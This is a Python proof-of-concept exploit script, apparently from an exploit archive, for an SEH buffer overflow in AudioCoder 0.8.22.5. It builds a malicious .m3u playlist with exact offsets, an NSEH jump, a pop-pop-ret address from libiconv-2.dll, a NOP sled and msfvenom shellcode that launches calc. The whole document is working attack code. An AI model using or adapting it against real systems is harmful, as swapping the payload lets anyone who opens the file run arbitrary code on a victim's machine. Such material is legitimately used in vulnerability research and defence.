# AudioCoder 0.8.22.5 Buffer Overflow (SEH)
# Creates a .m3u file that must be opened with AudioCoder to generate a buffer overflow

def main():
	filename = "audiocoder.m3u"
	prepend = "http://"
	# NSEH offset is 757
	# SEH offset is 761
	offset = "A"*757
	# pop pop ret found at 0x66017187 in libiconv-2.dll
	# nseh jumps 6 bytes into nops
	nseh = "\xeb\x06\x90\x90"
	seh = "\x87\x71\x01\x66"
	nops = "\x90" * 25
  # msfvenom -p windows/exec CMD="calc" -f python -b "\x00\x0a\x0d\x20\xff\x5c"
	buf =  ""
	buf += "\xd9\xd0\xb8\xa1\x88\x47\xe1\xd9\x74\x24\xf4\x5b\x2b"
	buf += "\xc9\xb1\x30\x31\x43\x18\x83\xc3\x04\x03\x43\xb5\x6a"
	buf += "\xb2\x1d\x5d\xe8\x3d\xde\x9d\x8d\xb4\x3b\xac\x8d\xa3"
	buf += "\x48\x9e\x3d\xa7\x1d\x12\xb5\xe5\xb5\xa1\xbb\x21\xb9"
	buf += "\x02\x71\x14\xf4\x93\x2a\x64\x97\x17\x31\xb9\x77\x26"
	buf += "\xfa\xcc\x76\x6f\xe7\x3d\x2a\x38\x63\x93\xdb\x4d\x39"
	buf += "\x28\x57\x1d\xaf\x28\x84\xd5\xce\x19\x1b\x6e\x89\xb9"
	buf += "\x9d\xa3\xa1\xf3\x85\xa0\x8c\x4a\x3d\x12\x7a\x4d\x97"
	buf += "\x6b\x83\xe2\xd6\x44\x76\xfa\x1f\x62\x69\x89\x69\x91"
	buf += "\x14\x8a\xad\xe8\xc2\x1f\x36\x4a\x80\xb8\x92\x6b\x45"
	buf += "\x5e\x50\x67\x22\x14\x3e\x6b\xb5\xf9\x34\x97\x3e\xfc"
	buf += "\x9a\x1e\x04\xdb\x3e\x7b\xde\x42\x66\x21\xb1\x7b\x78"
	buf += "\x8a\x6e\xde\xf2\x26\x7a\x53\x59\x2c\x7d\xe1\xe7\x02"
	buf += "\x7d\xf9\xe7\x32\x16\xc8\x6c\xdd\x61\xd5\xa6\x9a\x9e"
	buf += "\x9f\xeb\x8a\x36\x46\x7e\x8f\x5a\x79\x54\xd3\x62\xfa"
	buf += "\x5d\xab\x90\xe2\x17\xae\xdd\xa4\xc4\xc2\x4e\x41\xeb"
	buf += "\x71\x6e\x40\x88\x14\xfc\x08\x4f"
	
	attack_string = prepend + offset + nseh + seh + nops + buf
	
	file = open(filename, "w")
	file.write(attack_string)
	file.close()


if __name__ == '__main__':
	main()
